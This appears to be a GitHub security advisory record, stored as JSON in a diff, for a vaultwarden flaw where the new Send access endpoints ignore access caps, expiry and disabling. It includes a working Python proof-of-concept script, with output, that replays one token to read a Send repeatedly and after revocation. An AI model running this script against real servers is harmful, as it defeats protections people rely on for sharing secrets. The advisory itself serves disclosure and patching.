@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-wc45-m6pv-rrf9",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 5.3,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-863"
+    ],
+    "description": "### Summary\r\n\r\n> **Pre-release only.** The affected code was only on the development branch (and the `:testing` image) between commits `5c5e8e1a` (#7346) and `46ae59ea` (#7472). It was never part of a tagged release: 1.36.0 predates it and 1.37.0 shipped with the fix.\r\n\r\nThe anonymous Send access endpoints introduced by the 2026.6.0 rewrite do not enforce a Send's access limits. Anyone holding a Send link can read a \"one-time\" (or `max_access_count=N`) Send many more times than allowed, and can keep reading it after the creator disables it or it expires. Meanwhile the creator's access counter under-reports the real number of reads. The `max_access_count`, `expiration_date`, `deletion_date`, and `disabled` guarantees of Send are effectively defeated.\r\n\r\n### Details\r\n\r\nThe rewrite split anonymous access into two steps: get a 2-minute `send_access` token (`POST /identity/connect/token`, `grant_type=send_access`), then read the Send with it (`POST /api/sends/access` for text, `POST /api/sends/access/file/<file_id>` for files).\r\n\r\nAll limit enforcement was moved into token **issuance**. `SendTokens::generate_tokens` (`src/auth/send.rs:82-117`) checks `max_access_count`/`expiration_date`/`deletion_date`/`disabled`/password and does `access_count += 1` **once** (`:116`). The access handlers `process_access` (`src/api/core/sends.rs:516`) and `process_access_file` (`:592`) then re-check **nothing** and **never** increment `access_count`:\r\n\r\n```rust\r\n// src/api/core/sends.rs:592 (no checks, no increment)\r\nasync fn process_access_file(send: Send, file_id: SendFileId, host: Host, conn: DbConn, nt: Notify<'_>) -> JsonResult {\r\n    nt.send_send_update(...).await;\r\n    Ok(Json(json!({ \"url\": download_url(&host, &send.uuid, &file_id).await? })))\r\n}\r\n// The legacy handlers, retained in the same file (sends.rs:557-585), still check\r\n// expiration/deletion/disabled/password and do `send.access_count += 1` on every access.\r\n```\r\n\r\nThe `send_access` JWT (`BasicJwtClaims`) has no `jti`/nonce, so it is a replayable bearer for its full 2-minute lifetime. Consequences:\r\n\r\n- `access_count` counts **tokens issued, not reads**, so a `max_access_count=N` Send yields N tokens, each granting unlimited reads in its window, and the creator's `accessCount` shows only N.\r\n- A Send **disabled or expired mid-window stays readable** through an already-issued token.\r\n\r\n### PoC\r\n\r\nCreate a **File Send** with **Maximum Access Count = 1** in your vault. Set `SEND_ID` (its UUID, from the share link), `FILE_ID` (from `GET /api/sends`), and `VW` (your server), then run:\r\n\r\n```python\r\nimport json, os, base64, uuid, urllib.request, urllib.error, urllib.parse\r\nBASE, SEND_ID, FILE_ID = os.environ[\"VW\"], os.environ[\"SEND_ID\"], os.environ[\"FILE_ID\"]\r\n\r\ndef http(method, path, hdr=None, form=None):\r\n    body = urllib.parse.urlencode(form).encode() if form else None\r\n    h = {\"User-Agent\": \"vw1\"} | (hdr or {})\r\n    if form: h[\"Content-Type\"] = \"application/x-www-form-urlencoded\"\r\n    try:  r = urllib.request.urlopen(urllib.request.Request(BASE + path, body, h, method=method), timeout=30); return r.status, r.read()\r\n    except urllib.error.HTTPError as e: return e.code, e.read()\r\n\r\nsid = base64.urlsafe_b64encode(uuid.UUID(SEND_ID).bytes).decode().rstrip(\"=\")\r\n_, b = http(\"POST\", \"/identity/connect/token\", form={\"grant_type\": \"send_access\", \"client_id\": \"web\", \"send_id\": sid})\r\ntok = {\"Authorization\": \"Bearer \" + json.loads(b)[\"access_token\"]}          # the ONE access the max=1 Send allows\r\ns, _ = http(\"POST\", \"/identity/connect/token\", form={\"grant_type\": \"send_access\", \"client_id\": \"web\", \"send_id\": sid})\r\nprint(f\"[1] 2nd token issuance -> HTTP {s} (blocked: the max=1 cap fires only here, at issuance)\")\r\nfor i in range(1, 6):                                                        # ...yet ONE token reads the file 5x\r\n    s, _ = http(\"POST\", f\"/api/sends/access/file/{FILE_ID}\", hdr=tok)\r\n    print(f\"[2] download #{i} -> HTTP {s}\")\r\ninput(\"[3] now Disable the Send in your vault, then press Enter...\")\r\ns, _ = http(\"POST\", f\"/api/sends/access/file/{FILE_ID}\", hdr=tok)\r\nprint(f\"[4] access after disable -> HTTP {s} (should be 404)\")\r\n```\r\n\r\nOutput (each `/access/file` returns a fresh valid download URL; `GET /api/sends` shows `accessCount` still 1):\r\n\r\n```\r\n[1] 2nd token issuance -> HTTP 404 (blocked: the max=1 cap fires only at issuance)\r\n[2] download #1..#5   -> HTTP 200   (all five succeed with the one token)\r\n[4] access after disable -> HTTP 200 (should be 404)\r\n```\r\n\r\nText Sends behave identically (`process_access`, `sends.rs:516`). With `max_access_count=N`, issuing N tokens and looping gives N × unlimited reads. In testing, a `max=3` File was downloaded 15 times while the owner's `accessCount` read 3.\r\n\r\n### Impact\r\n\r\nA broken-access-control flaw (CWE-863) in the anonymous, unauthenticated Send access path. Anyone holding a Send link can exploit it: the intended recipient, or anyone it leaked to (forwarded email, Slack paste, browser history). They can read a Send beyond its access cap and keep reading it after the creator disables it or it expires, all invisibly to the creator, whose `accessCount` under-reports. This defeats Send's \"self-destruct after N views\", expiration, and revoke-by-disable guarantees for anyone relying on them to share sensitive data. Confidentiality-only. No account is required.\r\n\r\nA prior access-count bug in this feature (#1489) was an off-by-one handled as a normal bug; this rewrite regressed it into a systemic bypass.\r\n\r\n### Patches\r\n\r\nFixed before any release; 1.37.0 shipped with the fix (`46ae59ea`, #7472). The access endpoints re-check `disabled`, `expiration_date` and `deletion_date` on every access, so a disabled or expired Send stops being readable immediately, including through an already-issued token.\r\n\r\nReading a Send more than once with a single token was treated as hardening rather than a vulnerability, since the recipient already has the content and a downloaded file can be copied freely.\r\n\r\n### Suggested fix\r\n\r\nRe-validate `disabled`/`expiration_date`/`deletion_date` (and password) in `process_access` / `process_access_file` and increment `access_count` per read, as the retained legacy handlers already do. Alternatively, add a `jti` to the `send_access` token and invalidate it after one use.\r\n\r\n",
+    "ghsa_id": "GHSA-wc45-m6pv-rrf9",
+    "html_url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-wc45-m6pv-rrf9",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-wc45-m6pv-rrf9"
+      }
+    ],
+    "published_at": "2026-10-03T20:58:42Z",
+    "references": [],
+    "severity": "medium",
+    "summary": " Send access limits not enforced on the new Send access endpoints",
+    "updated_at": "2026-10-03T21:02:33Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "rust",
+          "name": "vaultwarden"
+        },
+        "patched_versions": "1.37.0",
+        "vulnerable_version_range": ">1.36.0, < 1.37.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "dani-garcia/vaultwarden"
+}
